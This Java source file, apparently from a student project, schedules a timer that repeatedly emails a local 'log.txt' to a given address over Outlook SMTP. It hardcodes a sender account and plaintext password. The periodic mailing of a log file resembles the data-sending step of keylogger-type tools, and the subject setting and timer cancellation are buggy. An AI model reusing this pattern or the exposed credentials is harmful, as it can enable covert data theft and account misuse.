import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.sql.DataSource;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.*;
import java.util.Timer;
import java.util.TimerTask;

public class mail extends Main{
    static int sayac = 0;
    static Timer myTimer = new Timer();
    static TimerTask gorev1;
    public  void timer(int a,String receiver) {

        gorev1 = new TimerTask() {
            public void run() {
                try {
                    send(receiver);
                } catch (MessagingException e) {
                    throw new RuntimeException(e);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }

                sayac++;

                if(sayac==0) myTimer.cancel();
            }
        };
        myTimer.schedule(gorev1,0,a); //500ms yani yarım saniyede bir


   Form nesne = new Form();

    }


    public void send(String receiver) throws MessagingException, IOException {
        String baslik = "deneme1";
        String mesaj = "bu bir deneme mailidir.";
        String host = "smtp.outlook.com";
        String port = "587";

        final String senderEmail = "kawhi2ceng@outlook.com";
        final String senderPassword = "ar478478";


        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.debug", "true");
        props.setProperty("mail.smtp.ssl.protocols", "TLSv1.2");

        Authenticator auth = new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(senderEmail, senderPassword);
            }
        };
        Session session = Session.getInstance(props, auth);

        try {

            MimeMessage msg = new MimeMessage(session);
            msg.setFrom(new InternetAddress(senderEmail));
            msg.addRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
            MimeBodyPart textBodyPart = new MimeBodyPart();
            textBodyPart.setText("your text");
        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(textBodyPart);

        File logfile = new File("log.txt");
        MimeBodyPart attachmentBodyPart = new MimeBodyPart();
        attachmentBodyPart.attachFile(logfile);

        multipart.addBodyPart(attachmentBodyPart);
        msg.setContent(multipart);
        Transport.send(msg);





















            msg.setSubject(baslik);

            msg.setText(mesaj);


        } catch (MessagingException ex) {
            System.out.println("Mesaj gönderilirken hata olustu: " + ex.getMessage());
        }
        {



        }
    }
}


